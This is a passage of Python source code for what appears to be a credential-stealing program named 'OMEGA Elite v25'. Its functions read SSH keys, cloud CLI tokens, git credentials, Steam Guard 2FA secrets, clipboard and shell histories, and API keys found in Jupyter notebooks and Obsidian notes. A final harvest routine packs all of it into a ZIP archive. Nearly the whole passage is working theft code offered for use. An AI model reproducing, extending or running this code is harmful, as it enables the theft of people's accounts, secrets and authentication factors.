    if not os.path.exists(vercel_token):
        vercel_token = os.path.join(HOME, ".vercel", "auth.json")
    if os.path.exists(vercel_token):
        results.append({"type": "Vercel Token",
                         "data": open(vercel_token, encoding="utf-8", errors="ignore").read()})

    # ── Netlify CLI ──
    netlify_cfg = os.path.join(HOME, ".netlify", "config.json")
    if os.path.exists(netlify_cfg):
        results.append({"type": "Netlify Token",
                         "data": open(netlify_cfg, encoding="utf-8", errors="ignore").read()})

    # ── Supabase CLI ──
    supabase_cfg = os.path.join(HOME, ".supabase", "access-token")
    if os.path.exists(supabase_cfg):
        results.append({"type": "Supabase Token",
                         "data": open(supabase_cfg, encoding="utf-8", errors="ignore").read()})

    # ── Railway CLI ──
    railway_cfg = os.path.join(HOME, ".railway", "config.json")
    if os.path.exists(railway_cfg):
        results.append({"type": "Railway Token",
                         "data": open(railway_cfg, encoding="utf-8", errors="ignore").read()})

    # ── Fly.io ──
    fly_cfg = os.path.join(HOME, ".fly", "config.yml")
    if os.path.exists(fly_cfg):
        results.append({"type": "Fly.io Config",
                         "data": open(fly_cfg, encoding="utf-8", errors="ignore").read()})

    # ── DigitalOcean CLI (doctl) ──
    do_cfg = os.path.join(HOME, ".config", "doctl", "config.yaml")
    if os.path.exists(do_cfg):
        results.append({"type": "DigitalOcean Token",
                         "data": open(do_cfg, encoding="utf-8", errors="ignore").read()[:1000]})

    # ── Terraform ──
    tf_cred = os.path.join(HOME, ".terraform.d", "credentials.tfrc.json")
    if os.path.exists(tf_cred):
        results.append({"type": "Terraform Credentials",
                         "data": open(tf_cred, encoding="utf-8", errors="ignore").read()})

    return results


# ─────────────────────────────────────────────────────────────────────────────
# WINDOWS STICKY NOTES (SQLite — Windows 10/11)
# ─────────────────────────────────────────────────────────────────────────────
def _get_sticky_notes() -> list:
    results = []
    sticky_paths = [
        os.path.join(LOCALAPPDATA, "Packages",
                     "Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe",
                     "LocalState", "plum.sqlite"),
        os.path.join(LOCALAPPDATA, "Microsoft", "Sticky Notes", "StickyNotes.snt"),
    ]
    for sp in sticky_paths:
        if not os.path.exists(sp):
            continue
        try:
            if sp.endswith(".sqlite"):
                temp = os.path.join(os.environ.get("TEMP",""), "__stickynotes.db")
                shutil.copy2(sp, temp)
                conn = sqlite3.connect(temp)
                for row in conn.execute("SELECT Text FROM Note").fetchall():
                    results.append({"type": "Sticky Note", "text": row[0][:500] if row[0] else ""})
                conn.close()
                try: os.remove(temp)
                except: pass
            else:
                # .snt is compound file — read raw text
                raw = open(sp, "rb").read()
                text = raw.decode("utf-16-le", errors="ignore").replace("\x00","")
                results.append({"type": "Sticky Notes Legacy", "data": text[:3000]})
        except Exception as e:
            results.append({"type": "Sticky Notes Error", "error": str(e)})
    return results


# ─────────────────────────────────────────────────────────────────────────────
# WINDOWS CLIPBOARD HISTORY (Win10/11 SQLite)
# ─────────────────────────────────────────────────────────────────────────────
def _get_clipboard_history() -> list:
    results = []
    clip_db = os.path.join(LOCALAPPDATA, "Microsoft", "Windows", "Clipboard",
                           "**", "*.sqlite")
    for f in glob.glob(clip_db, recursive=True)[:3]:
        try:
            temp = os.path.join(os.environ.get("TEMP",""), "__clipboard.db")
            shutil.copy2(f, temp)
            conn = sqlite3.connect(temp)
            # Try reading clipboard data table
            tables = [r[0] for r in conn.execute(
                "SELECT name FROM sqlite_master WHERE type='table'").fetchall()]
            for table in tables:
                try:
                    rows = conn.execute(f"SELECT * FROM [{table}] LIMIT 20").fetchall()
                    for row in rows:
                        text = " | ".join(str(c)[:200] for c in row if c)
                        if text.strip():
                            results.append({"type": "Clipboard History", "table": table, "data": text[:400]})
                except: pass
            conn.close()
            try: os.remove(temp)
            except: pass
        except Exception as e:
            results.append({"type": "Clipboard History Error", "error": str(e)})
    return results


# ─────────────────────────────────────────────────────────────────────────────
# WSL — bash history, SSH keys, Git config, env secrets
# ─────────────────────────────────────────────────────────────────────────────
def _get_wsl_data() -> list:
    results = []
    # WSL distributions live here
    wsl_root = os.path.join(LOCALAPPDATA, "Packages")
    distro_patterns = ["CanonicalGroupLimited*", "Debian*", "Kali*",
                       "Ubuntu*", "openSUSE*", "AlmaLinux*", "Fedora*"]
    distro_suffixes  = ["LocalState", "rootfs"]
    import fnmatch

    for pattern in distro_patterns:
        for match in glob.glob(os.path.join(wsl_root, pattern)):
            distro_name = os.path.basename(match)
            # Find /root and /home/* inside the distro rootfs
            rootfs = os.path.join(match, "LocalState", "rootfs")
            if not os.path.exists(rootfs):
                continue

            home_dirs = [os.path.join(rootfs, "root")]
            home_base = os.path.join(rootfs, "home")
            if os.path.exists(home_base):
                home_dirs += [os.path.join(home_base, u)
                              for u in os.listdir(home_base)]

            for hdir in home_dirs:
                if not os.path.exists(hdir):
                    continue
                # bash / zsh history
                for hist_file in [".bash_history", ".zsh_history", ".sh_history"]:
                    hp = os.path.join(hdir, hist_file)
                    if os.path.exists(hp):
                        try:
                            content = open(hp, "r", encoding="utf-8", errors="ignore").read()
                            results.append({"type": f"WSL/{distro_name} Shell History",
                                            "user": os.path.basename(hdir),
                                            "data": content[-3000:]})  # last 3000 chars
                        except: pass

                # SSH keys
                ssh_dir = os.path.join(hdir, ".ssh")
                if os.path.exists(ssh_dir):
                    for f in os.listdir(ssh_dir):
                        fp = os.path.join(ssh_dir, f)
                        if os.path.isfile(fp):
                            try:
                                results.append({"type": f"WSL/{distro_name} SSH",
                                                "file": f,
                                                "data": open(fp, encoding="utf-8", errors="ignore").read()[:2000]})
                            except: pass

                # .gitconfig
                gitcfg = os.path.join(hdir, ".gitconfig")
                if os.path.exists(gitcfg):
                    results.append({"type": f"WSL/{distro_name} gitconfig",
                                    "data": open(gitcfg, encoding="utf-8", errors="ignore").read()})

                # .env / .profile / .bashrc — may contain API keys
                for f in [".env", ".profile", ".bashrc", ".zshrc", ".bash_profile"]:
                    fp = os.path.join(hdir, f)
                    if os.path.exists(fp):
                        try:
                            content = open(fp, "r", encoding="utf-8", errors="ignore").read()
                            if any(k in content for k in ["TOKEN", "KEY", "SECRET", "PASS",
                                                          "API_", "AUTH_", "ACCESS_"]):
                                results.append({"type": f"WSL/{distro_name} Env File",
                                                "file": f, "data": content[:2000]})
                        except: pass

    return results


# ─────────────────────────────────────────────────────────────────────────────
# WINDOWS CERTIFICATE STORE — Personal / SmartCard / Code Signing certs
# ─────────────────────────────────────────────────────────────────────────────
def _get_certificate_store() -> list:
    results = []
    try:
        import ctypes, ctypes.wintypes as wt

        CERT_STORE_PROV_SYSTEM   = 10
        CERT_SYSTEM_STORE_CURRENT_USER = 0x00010000

        crypt32 = ctypes.windll.crypt32

        for store_name in ["MY", "CA", "ROOT", "TrustedPublisher"]:
            store = crypt32.CertOpenStore(
                CERT_STORE_PROV_SYSTEM, 0, None,
                CERT_SYSTEM_STORE_CURRENT_USER,
                ctypes.c_wchar_p(store_name)
            )
            if not store:
                continue
            try:
                cert = crypt32.CertEnumCertificatesInStore(store, None)
                while cert:
                    # Get subject name
                    name_size = crypt32.CertGetNameStringW(
                        cert, 4, 0, None, None, 0)  # CERT_NAME_SIMPLE_DISPLAY_TYPE=4
                    name_buf = ctypes.create_unicode_buffer(name_size)
                    crypt32.CertGetNameStringW(cert, 4, 0, None, name_buf, name_size)

                    # Get issuer
                    iss_size = crypt32.CertGetNameStringW(cert, 4, 1, None, None, 0)
                    iss_buf  = ctypes.create_unicode_buffer(iss_size)
                    crypt32.CertGetNameStringW(cert, 4, 1, None, iss_buf, iss_size)

                    results.append({
                        "type":    f"Certificate/{store_name}",
                        "subject": name_buf.value,
                        "issuer":  iss_buf.value,
                    })
                    cert = crypt32.CertEnumCertificatesInStore(store, cert)
            finally:
                crypt32.CertCloseStore(store, 0)
    except Exception as e:
        results.append({"type": "CertStore Error", "error": str(e)})
    return results


# ─────────────────────────────────────────────────────────────────────────────
# OBSIDIAN VAULT — notes that often contain passwords and seed phrases
# ─────────────────────────────────────────────────────────────────────────────
def _get_obsidian_data() -> list:
    results = []
    import re
    obsidian_cfg = os.path.join(APPDATA, "obsidian", "obsidian.json")
    SECRETS_RE = re.compile(
        r'(?:password|passwd|pwd|api.?key|token|secret|seed|mnemonic|private.?key)'
        r'[:\s=]+([^\n]{8,})', re.I)

    vault_dirs = []
    if os.path.exists(obsidian_cfg):
        try:
            cfg = json.load(open(obsidian_cfg, encoding="utf-8", errors="ignore"))
            for vid, vdata in cfg.get("vaults", {}).items():
                vpath = vdata.get("path", "")
                if vpath and os.path.exists(vpath):
                    vault_dirs.append(vpath)
        except: pass

    # Also check common default locations
    for candidate in [
        os.path.join(HOME, "Documents", "Obsidian Vault"),
        os.path.join(HOME, "OneDrive", "Obsidian"),
        os.path.join(HOME, "Desktop", "Obsidian Vault"),
        os.path.join(HOME, "Obsidian"),
    ]:
        if os.path.exists(candidate):
            vault_dirs.append(candidate)

    seen = set()
    for vault in vault_dirs:
        for f in glob.glob(os.path.join(vault, "**", "*.md"), recursive=True):
            if f in seen:
                continue
            seen.add(f)
            try:
                sz = os.path.getsize(f)
                if sz == 0 or sz > 500000:
                    continue
                content = open(f, "r", encoding="utf-8", errors="ignore").read()
                hits = SECRETS_RE.findall(content)
                if hits:
                    results.append({
                        "type":   "Obsidian Note (sensitive)",
                        "file":   f,
                        "hits":   hits[:10],
                        "data":   content[:1000],
                    })
            except: pass

    return results


# ─────────────────────────────────────────────────────────────────────────────
# SPOTIFY — OAuth access token / account
# ─────────────────────────────────────────────────────────────────────────────
def _get_spotify_token() -> list:
    results = []
    # Spotify Desktop stores auth in LevelDB
    spotify_ldb = os.path.join(APPDATA, "Spotify", "Local Storage", "leveldb")
    import re
    TOKEN_RE = re.compile(r'(access_token|oauth_token|auth_token)["\s:=]+([A-Za-z0-9\.\-_]{40,})', re.I)

    for f in glob.glob(os.path.join(spotify_ldb, "*.ldb")) + \
             glob.glob(os.path.join(spotify_ldb, "*.log")):
        try:
            text = open(f, "rb").read().decode("utf-8", errors="ignore")
            for _, tok in TOKEN_RE.findall(text):
                results.append({"type": "Spotify OAuth Token", "token": tok[:200]})
        except: pass

    # Check Spotify prefs file
    spotify_prefs = os.path.join(APPDATA, "Spotify", "prefs")
    if os.path.exists(spotify_prefs):
        content = open(spotify_prefs, encoding="utf-8", errors="ignore").read()
        results.append({"type": "Spotify Prefs", "data": content[:1000]})

    return results


# ─────────────────────────────────────────────────────────────────────────────
# GEFORCE EXPERIENCE / NVIDIA SHIELD — account token
# ─────────────────────────────────────────────────────────────────────────────
def _get_nvidia_data() -> list:
    results = []
    import re
    TOKEN_RE = re.compile(r'(?:token|id_token|access_token|refresh_token)["\s:=]+([A-Za-z0-9\.\-_]{30,})', re.I)

    nvidia_paths = [
        os.path.join(LOCALAPPDATA, "NVIDIA", "NvBackend"),
        os.path.join(LOCALAPPDATA, "NVIDIA GeForce Experience"),
        os.path.join(PROGRAMDATA := os.environ.get("PROGRAMDATA","C:\\ProgramData"),
                     "NVIDIA Corporation", "Drs"),
    ]
    for np in nvidia_paths:
        for f in glob.glob(os.path.join(np, "**", "*.json"), recursive=True) + \
                 glob.glob(os.path.join(np, "**", "*.dat"), recursive=True):
            try:
                content = open(f, "r", encoding="utf-8", errors="ignore").read()
                hits = TOKEN_RE.findall(content)
                if hits:
                    results.append({"type": "NVIDIA/GFE Token", "file": os.path.basename(f),
                                    "tokens": hits[:5]})
            except: pass
    return results


# ─────────────────────────────────────────────────────────────────────────────
# STEAM GUARD 2FA — MaFile / SGDBak (authenticator secrets)
# ─────────────────────────────────────────────────────────────────────────────
def _get_steam_guard() -> list:
    results = []

    # Steam Desktop Authenticator .maFile
    mafile_locations = [
        os.path.join(HOME, "Desktop"),
        os.path.join(HOME, "Documents"),
        os.path.join(HOME, "Downloads"),
        APPDATA,
        LOCALAPPDATA,
    ]
    for d in mafile_locations:
        for f in glob.glob(os.path.join(d, "**", "*.maFile"), recursive=True)[:10]:
            try:
                data = open(f, "r", encoding="utf-8", errors="ignore").read()
                results.append({"type": "Steam Guard MaFile", "file": f,
                                 "data": data[:1000]})
            except: pass

    # WinAuth, Authy Desktop, Steam Guard backup
    winauth = os.path.join(APPDATA, "WinAuth")
    if os.path.exists(winauth):
        for f in glob.glob(os.path.join(winauth, "*.xml")) + \
                 glob.glob(os.path.join(winauth, "*.json")):
            try:
                results.append({"type": "WinAuth 2FA", "file": os.path.basename(f),
                                 "data": open(f, encoding="utf-8", errors="ignore").read()[:1000]})
            except: pass

    # SGDBak (SteamGuard Database Backup)
    for d in [HOME, os.path.join(HOME, "Desktop"), os.path.join(HOME, "Documents")]:
        for f in glob.glob(os.path.join(d, "**", "*sgdbak*"), recursive=True)[:3] + \
                 glob.glob(os.path.join(d, "**", "*steamguard*"), recursive=True)[:3]:
            try:
                results.append({"type": "Steam Guard Backup", "file": f,
                                 "data": open(f, "r", encoding="utf-8", errors="ignore").read()[:500]})
            except: pass

    return results


# ─────────────────────────────────────────────────────────────────────────────
# WINDOWS RunMRU — recently executed commands (Run dialog)
# ─────────────────────────────────────────────────────────────────────────────
def _get_run_mru() -> list:
    results = []
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU")
        i = 0
        while True:
            try:
                n, v, _ = winreg.EnumValue(key, i)
                if n.lower() != "mrulist":
                    results.append({"type": "RunMRU Command", "key": n, "command": str(v)})
                i += 1
            except OSError: break
        winreg.CloseKey(key)
    except: pass

    # TypedURLs (what user typed in IE/Edge address bar)
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Internet Explorer\TypedURLs")
        i = 0
        while True:
            try:
                n, v, _ = winreg.EnumValue(key, i)
                results.append({"type": "IE TypedURL", "key": n, "url": str(v)})
                i += 1
            except OSError: break
        winreg.CloseKey(key)
    except: pass

    # Recent PowerShell history
    ps_history = os.path.join(APPDATA, "Microsoft", "Windows", "PowerShell",
                              "PSReadLine", "ConsoleHost_history.txt")
    if os.path.exists(ps_history):
        content = open(ps_history, "r", encoding="utf-8", errors="ignore").read()
        results.append({"type": "PowerShell History", "data": content[-4000:]})  # last 4KB

    return results


# ─────────────────────────────────────────────────────────────────────────────
# FIGMA / NOTION / LINEAR — design / productivity desktop tokens
# ─────────────────────────────────────────────────────────────────────────────
def _get_productivity_tokens() -> list:
    import re
    results = []
    TOKEN_RE = re.compile(r'(?:token|access_token|auth|api.?key|id_token)["\s:=]+([A-Za-z0-9\.\-_]{30,})', re.I)

    apps = {
        "Figma":   os.path.join(APPDATA, "Figma"),
        "Notion":  os.path.join(APPDATA, "Notion"),
        "Linear":  os.path.join(APPDATA, "Linear"),
        "Loom":    os.path.join(APPDATA, "Loom"),
        "Miro":    os.path.join(APPDATA, "Miro"),
        "Trello":  os.path.join(APPDATA, "Trello"),
        "Asana":   os.path.join(APPDATA, "Asana"),
    }

    for app_name, app_path in apps.items():
        if not os.path.exists(app_path):
            continue
        for f in glob.glob(os.path.join(app_path, "Local Storage", "leveldb", "*.ldb"))[:5] + \
                 glob.glob(os.path.join(app_path, "**", "*.json"), recursive=True)[:5]:
            try:
                text = open(f, "rb").read().decode("utf-8", errors="ignore")
                hits = TOKEN_RE.findall(text)
                if hits:
                    results.append({
                        "type":   f"{app_name} Auth Token",
                        "file":   os.path.basename(f),
                        "tokens": list(set(hits))[:10],
                    })
            except: pass

    return results


# ─────────────────────────────────────────────────────────────────────────────
# FTP CLIENTS — CyberDuck / Core FTP / FlashFXP / WS_FTP
# ─────────────────────────────────────────────────────────────────────────────
def _get_ftp_clients() -> list:
    results = []

    # ── CyberDuck ──
    cyberduck = os.path.join(APPDATA, "Cyberduck", "Bookmarks")
    for f in glob.glob(os.path.join(cyberduck, "**", "*.duck"), recursive=True):
        try:
            results.append({"type": "CyberDuck Bookmark", "file": os.path.basename(f),
                             "data": open(f, encoding="utf-8", errors="ignore").read()[:500]})
        except: pass

    # ── Core FTP ──
    coreftp_ini = os.path.join(HOME, ".coreftp", "sites.dat")
    if not os.path.exists(coreftp_ini):
        coreftp_ini = os.path.join(APPDATA, "CoreFTP", "sites.dat")
    if os.path.exists(coreftp_ini):
        results.append({"type": "CoreFTP Sites",
                         "data": open(coreftp_ini, encoding="utf-8", errors="ignore").read()[:1000]})

    # ── FlashFXP ──
    flashfxp = os.path.join(APPDATA, "FlashFXP")
    for f in glob.glob(os.path.join(flashfxp, "**", "*.dat"), recursive=True)[:5]:
        try:
            results.append({"type": "FlashFXP Session", "file": os.path.basename(f),
                             "data": open(f, encoding="utf-8", errors="ignore").read()[:500]})
        except: pass

    # ── WS_FTP ──
    wsftp = os.path.join(APPDATA, "Ipswitch", "WS_FTP")
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Ipswitch\WS_FTP")
        i = 0
        while True:
            try:
                n, v, _ = winreg.EnumValue(key, i)
                results.append({"type": "WS_FTP Registry", "key": n, "value": str(v)[:200]})
                i += 1
            except OSError: break
    except: pass

    return results


# ─────────────────────────────────────────────────────────────────────────────
# JUPYTER NOTEBOOKS — API key / token scanner in .ipynb files
# ─────────────────────────────────────────────────────────────────────────────
def _get_jupyter_secrets() -> list:
    import re, json as _json
    results = []
    TOKEN_PATTERNS = [
        re.compile(r'(sk-[A-Za-z0-9]{48})'),                     # OpenAI
        re.compile(r'(ghp_[A-Za-z0-9]{36})'),                    # GitHub
        re.compile(r'(AIza[0-9A-Za-z\-_]{35})'),                 # Google
        re.compile(r'(AKIA[0-9A-Z]{16})'),                       # AWS
        re.compile(r'(?:api.?key|token|secret)["\s:=]+([A-Za-z0-9\-_\.]{20,})', re.I),
    ]

    scan_dirs = [
        os.path.join(HOME, "Desktop"),
        os.path.join(HOME, "Documents"),
        os.path.join(HOME, "Downloads"),
        HOME,
    ]
    seen = set()
    for d in scan_dirs:
        for f in glob.glob(os.path.join(d, "**", "*.ipynb"), recursive=True):
            if f in seen:
                continue
            seen.add(f)
            try:
                sz = os.path.getsize(f)
                if sz == 0 or sz > 5 * 1024 * 1024:
                    continue
                nb = _json.load(open(f, encoding="utf-8", errors="ignore"))
                # Extract source from all cells
                full_text = ""
                for cell in nb.get("cells", []):
                    src = cell.get("source", "")
                    if isinstance(src, list):
                        full_text += "".join(src)
                    else:
                        full_text += str(src)
                    # Also check outputs
                    for output in cell.get("outputs", []):
                        for txt in output.get("text", []):
                            full_text += str(txt)

                hits = []
                for pat in TOKEN_PATTERNS:
                    for m in pat.finditer(full_text):
                        hits.append(m.group(0)[:150])
                if hits:
                    results.append({
                        "type":   "Jupyter Notebook Secret",
                        "file":   f,
                        "tokens": list(set(hits))[:15],
                    })
            except: pass

    # Also check Jupyter config / token file
    jupyter_data = os.path.join(HOME, ".jupyter")
    if os.path.exists(jupyter_data):
        for f in glob.glob(os.path.join(jupyter_data, "**", "*.json"), recursive=True) + \
                 glob.glob(os.path.join(jupyter_data, "**", "*.py"), recursive=True):
            try:
                results.append({"type": "Jupyter Config",
                                 "data": open(f, encoding="utf-8", errors="ignore").read()[:800]})
            except: pass

    return results


# ─────────────────────────────────────────────────────────────────────────────
# GIT REPOSITORIES — scan .git/config for embedded credentials
# ─────────────────────────────────────────────────────────────────────────────
def _get_git_repo_creds() -> list:
    import re, urllib.parse
    results = []
    CRED_URL_RE = re.compile(r'https?://([^:@\s]+):([^@\s]+)@', re.I)  # https://user:pass@

    scan_roots = [
        os.path.join(HOME, "Desktop"),
        os.path.join(HOME, "Documents"),
        os.path.join(HOME, "Downloads"),
        os.path.join(HOME, "source"),   # common VS default
        os.path.join(HOME, "repos"),
        HOME,
    ]
    seen = set()
    for root_dir in scan_roots:
        if not os.path.exists(root_dir):
            continue
        for root, dirs, files in os.walk(root_dir):
            # Look for .git directories
            if ".git" in dirs:
                config_path = os.path.join(root, ".git", "config")
                if config_path not in seen and os.path.exists(config_path):
                    seen.add(config_path)
                    try:
                        content = open(config_path, encoding="utf-8", errors="ignore").read()
                        # Check for embedded credentials in remote URL
                        creds = CRED_URL_RE.findall(content)
                        if creds:
                            for user, pw in creds:
                                results.append({
                                    "type":     "Git Remote Credential",
                                    "path":     config_path,
                                    "username": user,
                                    "password": urllib.parse.unquote(pw)[:200],
                                })
                        # Always include config if it has urls
                        if "url" in content.lower():
                            results.append({
                                "type": "Git Config",
                                "path": config_path,
                                "data": content[:800],
                            })
                    except: pass
            dirs[:] = [d for d in dirs if d not in {"node_modules","__pycache__",
                                                      ".git","vendor","dist","build",
                                                      "Windows","Program Files"}]

    # Also check git credential helpers
    git_cred_store = os.path.join(HOME, ".git-credentials")
    if os.path.exists(git_cred_store):
        results.append({"type": "Git Credentials Store",
                         "data": open(git_cred_store, encoding="utf-8", errors="ignore").read()})

    return results


# ─────────────────────────────────────────────────────────────────────────────
# v25 HARVEST
# ─────────────────────────────────────────────────────────────────────────────
def run_omega_harvest_v25(log_func=None) -> bytes:
    """OMEGA Elite v25 — absolute maximum extraction. Returns ZIP bytes."""
    import zipfile as _zf, io

    def log(m):
        if log_func: log_func(m)

    # Build on v24 base
    zip_v24 = run_omega_harvest_v24(log_func)
    v24_data = {}
    with _zf.ZipFile(io.BytesIO(zip_v24), "r") as z:
        for name in z.namelist():
            v24_data[name] = z.read(name)

    v25 = {}

    log("[v25] Database clients (DBeaver / HeidiSQL / MongoDB / Navicat)…")
    v25["database_clients"] = _get_database_clients()

    log("[v25] API clients (Postman / Insomnia / Bruno)…")
    v25["api_clients"] = _get_api_clients()

    log("[v25] Cloud CLIs (Azure / GCloud / Heroku / Firebase / GitHub CLI / Vercel)…")
    v25["cloud_clis"] = _get_cloud_cli_tokens()

    log("[v25] Windows Sticky Notes…")
    v25["sticky_notes"] = _get_sticky_notes()

    log("[v25] Windows Clipboard History…")
    v25["clipboard_history"] = _get_clipboard_history()

    log("[v25] WSL (bash history / SSH / env secrets)…")
    v25["wsl"] = _get_wsl_data()

    log("[v25] Windows Certificate Store (personal / code signing)…")
    v25["certificates"] = _get_certificate_store()

    log("[v25] Obsidian vault (password notes)…")
    v25["obsidian"] = _get_obsidian_data()

    log("[v25] Spotify OAuth token…")
    v25["spotify"] = _get_spotify_token()

    log("[v25] NVIDIA / GeForce Experience token…")
    v25["nvidia"] = _get_nvidia_data()

    log("[v25] Steam Guard 2FA (MaFile / WinAuth / SGDBak)…")
    v25["steam_guard"] = _get_steam_guard()

    log("[v25] RunMRU / PowerShell history / IE TypedURLs…")
    v25["run_mru"] = _get_run_mru()

    log("[v25] Figma / Notion / Linear / Loom / Miro tokens…")
    v25["productivity"] = _get_productivity_tokens()

    log("[v25] FTP clients (CyberDuck / CoreFTP / FlashFXP / WS_FTP)…")
    v25["ftp_clients"] = _get_ftp_clients()

    log("[v25] Jupyter notebooks (API key scan)…")
    v25["jupyter"] = _get_jupyter_secrets()

    log("[v25] Git repository embedded credentials…")
    v25["git_creds"] = _get_git_repo_creds()

    # Pack combined zip
    buf = io.BytesIO()
    with _zf.ZipFile(buf, "w", _zf.ZIP_DEFLATED, compresslevel=9) as zf:
        for name, data in v24_data.items():
            if name != "SUMMARY.json":
                zf.writestr(name, data)
        for category, items in v25.items():
            if items:
                zf.writestr(f"v25/{category}.json",
                            json.dumps(items, indent=2, ensure_ascii=False))

        prev_summary = json.loads(v24_data.get("SUMMARY.json", b"{}"))
        prev_summary.update({
            "version":          "OMEGA Elite v25",
            "db_clients":       len(v25["database_clients"]),
            "api_clients":      len(v25["api_clients"]),
            "cloud_clis":       len(v25["cloud_clis"]),
            "sticky_notes":     len(v25["sticky_notes"]),
            "clipboard_hist":   len(v25["clipboard_history"]),
            "wsl_data":         len(v25["wsl"]),
            "certificates":     len(v25["certificates"]),
            "obsidian":         len(v25["obsidian"]),
            "spotify":          len(v25["spotify"]),
            "nvidia":           len(v25["nvidia"]),
            "steam_guard":      len(v25["steam_guard"]),
            "run_mru":          len(v25["run_mru"]),
            "productivity":     len(v25["productivity"]),
            "ftp_clients":      len(v25["ftp_clients"]),
            "jupyter":          len(v25["jupyter"]),
            "git_creds":        len(v25["git_creds"]),
        })
        zf.writestr("SUMMARY.json", json.dumps(prev_summary, indent=2))

    total_v25 = sum(len(v) for v in v25.values())
    log(f"[v25] ✓ Complete — {total_v25} v25 records + full v24+v23 archive")
    return buf.getvalue()


# ── final public alias — always calls maximum version ──
def run_omega_harvest(log_func=None) -> bytes:  # noqa: F811
    """OMEGA Elite v25 — absolute maximum extraction."""
    return run_omega_harvest_v25(log_func)
